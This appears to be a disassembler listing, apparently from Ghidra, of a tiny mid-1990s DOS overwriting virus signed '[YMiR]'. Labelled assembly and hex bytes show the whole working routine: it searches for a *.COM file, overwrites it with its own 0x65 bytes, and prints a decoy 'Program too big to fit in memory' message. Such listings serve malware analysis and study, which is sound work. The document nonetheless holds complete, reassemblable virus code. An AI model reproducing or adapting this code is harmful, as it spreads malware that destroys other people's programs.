                                                          ;XREF[1,1]:   0000:010c(*),0000:010c(*)
Disk Transfer...                DTA                                                 ;Used internally by DOS
   |_Disk Transfer...reserved        db[21]      ??
      |_Disk Transfer...[0]             db          ??
      |_Disk Transfer...[1]             db          ??
      |_Disk Transfer...[2]             db          ??
      |_Disk Transfer...[3]             db          ??
      |_Disk Transfer...[4]             db          ??
      |_Disk Transfer...[5]             db          ??
      |_Disk Transfer...[6]             db          ??
      |_Disk Transfer...[7]             db          ??
      |_Disk Transfer...[8]             db          ??
      |_Disk Transfer...[9]             db          ??
      |_Disk Transfer...[10]            db          ??
      |_Disk Transfer...[11]            db          ??
      |_Disk Transfer...[12]            db          ??
      |_Disk Transfer...[13]            db          ??
      |_Disk Transfer...[14]            db          ??
      |_Disk Transfer...[15]            db          ??
      |_Disk Transfer...[16]            db          ??
      |_Disk Transfer...[17]            db          ??
      |_Disk Transfer...[18]            db          ??
      |_Disk Transfer...[19]            db          ??
      |_Disk Transfer...[20]            db          ??
   |_Disk Transfer...attribute       db          ??
   |_Disk Transfer...time            dw          ??
   |_Disk Transfer...date            dw          ??
   |_Disk Transfer...size            db[4]       ??
      |_Disk Transfer...[0]             db          ??
      |_Disk Transfer...[1]             db          ??
      |_Disk Transfer...[2]             db          ??
      |_Disk Transfer...[3]             db          ??
   |_Disk Transfer...filename        char[13]    ??
      |_Disk Transfer...[0]             char        ??
      |_Disk Transfer...[1]             char        ??
      |_Disk Transfer...[2]             char        ??
      |_Disk Transfer...[3]             char        ??
      |_Disk Transfer...[4]             char        ??
      |_Disk Transfer...[5]             char        ??
      |_Disk Transfer...[6]             char        ??
      |_Disk Transfer...[7]             char        ??
      |_Disk Transfer...[8]             char        ??
      |_Disk Transfer...[9]             char        ??
      |_Disk Transfer...[10]            char        ??
      |_Disk Transfer...[11]            char        ??
      |_Disk Transfer...[12]            char        ??
                            VIRUS_START:                  ;XREF[1]:     0000:0117(*)
ram:0000:0100   b44e            MOV         AH,0x4e                                 ;Find first matching file
ram:0000:0102   33c9            XOR         CX,CX                                   ;File mask; normal files (no hidden/s...
ram:0000:0104   ba5f01          MOV         DX,COM_FILES_PATTERN                    ;= "*.COM"
ram:0000:0107   cd21            INT         0x21                                    ;Fills the DTA (at 0x80)
ram:0000:0109   b8023d          MOV         AX,0x3d02                               ;Open file for R/W
ram:0000:010c   ba9e00          MOV         DX,Disk Transfer Area:DTA_0000_0080.f...
ram:0000:010f   cd21            INT         0x21                                    ;Returns: AX=file handle
ram:0000:0111   93              XCHG        AX,BX
ram:0000:0112   b440            MOV         AH,0x40                                 ;Write to file
ram:0000:0114   b96500          MOV         CX,0x65                                 ;Virus size
ram:0000:0117   ba0001          MOV         DX,VIRUS_START
ram:0000:011a   cd21            INT         0x21
ram:0000:011c   b43e            MOV         AH,0x3e                                 ;Close file
ram:0000:011e   cd21            INT         0x21
ram:0000:0120   ba3c01          MOV         DX,PAYLOAD_MESSAGE                      ;= "Program too big to fit in memory\...
ram:0000:0123   b409            MOV         AH,0x9                                  ;Print string
ram:0000:0125   cd21            INT         0x21
ram:0000:0127   cd20            INT         0x20                                    ;Terminate program
                            AUTHOR_STRING:
ram:0000:0129   5b594d695...    ds          "[YMiR]\0DHA 8/24/95"
                            PAYLOAD_MESSAGE:              ;XREF[1]:     0000:0120(*)
ram:0000:013c   50726f677...    ds          "Program too big to fit in memory\r\n$"
                            COM_FILES_PATTERN:            ;XREF[1]:     0000:0104(*)
ram:0000:015f   2a2e434f4d00    ds          "*.COM"